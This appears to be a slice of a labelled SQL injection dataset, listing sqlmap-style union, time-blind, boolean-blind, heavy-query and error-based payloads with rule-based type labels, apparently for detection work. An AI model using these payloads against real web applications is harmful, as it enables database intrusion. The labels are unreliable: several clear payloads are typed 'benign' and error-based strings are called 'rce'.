row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
1230,"1 ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1231,( select * from ( select ( sleep ( 5 ) ) ) srmq ) --,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1232,"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1233,"1' ) as ywtu where 3009 = 3009 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
1234,"-9622' union all select 7208,7208,7208,7208#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1235,1'|| ( select 'jmao' where 3009 = 3009,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1236,"1 ) where 4698 = 4698 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
1237,"1'|| ( select 'rfjl' where 2476 = 2476 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) ||'",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
1238,"1', ( select ( case when ( 6894 = 6087 ) then 1 else 6894* ( select 6894 from information_schema.character_sets ) end ) )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1239,"1 ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
1240,"1"" ) where 9285 = 9285 and 8506 = 8343#",1,,boolean_blind,generic,0.95,9285 = 9285 and detected — boolean_blind injection (priority 8) on generic,rule-based
1241,1'+ ( select wgmn where 4368 = 4368 and 7859 = 6151 ) +',1,,boolean_blind,generic,0.95,4368 = 4368 and detected — boolean_blind injection (priority 8) on generic,rule-based
1242,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and 'fdgq' = 'fdgq,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1243,-6200%' ) ) or 8077 = 4661,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1244,1 ) rlike sleep ( 5 ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1245,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1246,1 ) ) ) and sleep ( 5 ) and ( ( ( 6618 = 6618,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
1247,"1' ) as mvai where 5856 = 5856 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1248,1' ) as zxos where 2745 = 2745,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1249,"-6846%"" ) ) or ( 8459 = 8459 ) *4906 and ( ( ""%"" = """,1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
1250,"1"" ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""mxnj"" like ""mxnj",1,,boolean_blind,postgresql,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on postgresql",rule-based
1251,"1%"" ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1252,1 ) ) as sfan where 7176 = 7176 and 7017 = 7358,1,,boolean_blind,generic,0.95,7176 = 7176 and detected — boolean_blind injection (priority 8) on generic,rule-based
1253,"1"" ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""xnsj"" like ""xnsj",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
1254,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'tpih' = 'tpih",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
1255,"1"" ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""ozvp"" = ""ozvp",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1256,"1"" ) waitfor delay '0:0:5' and ( ""hhzy"" like ""hhzy",1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1257,"1' and make_set ( 3445 = 5963,5963 ) and 'wjfw' = 'wjfw",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1258,"1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""menm"" like ""menm",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
1259,-7199'|| ( select 'ssty' where 5406 = 5406 order by 1#,1,,boolean_blind,generic,0.95,5406 = 5406 or detected — boolean_blind injection (priority 8) on generic,rule-based
